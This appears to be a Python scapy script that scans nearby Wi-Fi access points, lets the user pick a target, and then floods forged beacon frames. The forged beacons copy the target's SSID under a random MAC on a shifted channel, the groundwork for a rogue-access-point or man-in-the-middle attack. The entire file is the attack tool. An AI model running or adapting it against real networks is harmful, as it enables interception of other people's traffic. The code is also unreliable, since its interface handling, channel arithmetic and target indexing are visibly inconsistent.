import argparse

from scapy.all import *
from threading import Thread
import pandas

# initialize the networks dataframe that will contain all access points nearby
from scapy.layers.dot11 import Dot11Beacon, Dot11, Dot11Elt, RadioTap

parser = argparse.ArgumentParser(description='Fake chanel script')

parser.add_argument("-i", "--interface", default="wlan0mon", help="Interface you want to attack")
args = parser.parse_args()

networks = pandas.DataFrame(columns=["BSSID", "SSID", "dBm_Signal", "Channel", "Number"])
networksBeacon = pandas.DataFrame(columns=["BSSID", "SSID", "Packet"])

# set the index BSSID (MAC address of the AP)
networks.set_index("BSSID", inplace=True)
networksBeacon.set_index("BSSID", inplace=True)
interface = "wlp5s0mon"

addr = []


def callback(packet):
    i = 0
    if packet.haslayer(Dot11Beacon):
        # extract the MAC address of the network
        bssid = packet[Dot11].addr2
        # get the name of it
        ssid = packet[Dot11Elt].info.decode()
        try:
            dbm_signal = packet.dBm_AntSignal
        except:
            dbm_signal = "N/A"
        # extract network stats
        stats = packet[Dot11Beacon].network_stats()
        # get the channel of the AP
        channel = stats.get("channel")
        # get the crypto
        networks.loc[bssid] = (ssid, dbm_signal, channel, i)
        addr.append(packet)
        networksBeacon.loc[bssid] = (ssid, packet)

    for index, row in networks.iterrows():
        i += 1
        row['Number'] = i


def change_channel():
    ch = 1
    while True:
        os.system(f"iwconfig {interface} channel {ch}")
        # switch channel from 1 to 14 each 0.5s
        ch = ch + 6 % 14 + 1
        time.sleep(0.5)


if __name__ == "__main__":
    # interface name, check using iwconfig
    channel_changer = Thread(target=change_channel)
    channel_changer.daemon = True
    channel_changer.start()

    # start the thread that prints all the networks
    sniff(prn=callback, iface=interface, timeout=10)
    print(networks)
    # start sniffing
    print("\nSelect target, between 1 and " + str(len(networks)))

    # Get the input of the user
    userInput = int(input())

    channel = addr[userInput][Dot11Beacon].network_stats().get("channel")
    new_channel = channel + 6 if channel <= 6 else channel - 6

    sender_mac = RandMAC()
    ssid = addr[userInput].info.decode()
    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=sender_mac, addr3=sender_mac)
    beacon = Dot11Beacon(cap="ESS+privacy")
    essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
    dsset = Dot11Elt(ID="DSset", info=chr(new_channel))
    frame = RadioTap() / dot11 / beacon / essid / dsset
    sendp(frame, inter=0.1, iface=args.interface, loop=1)
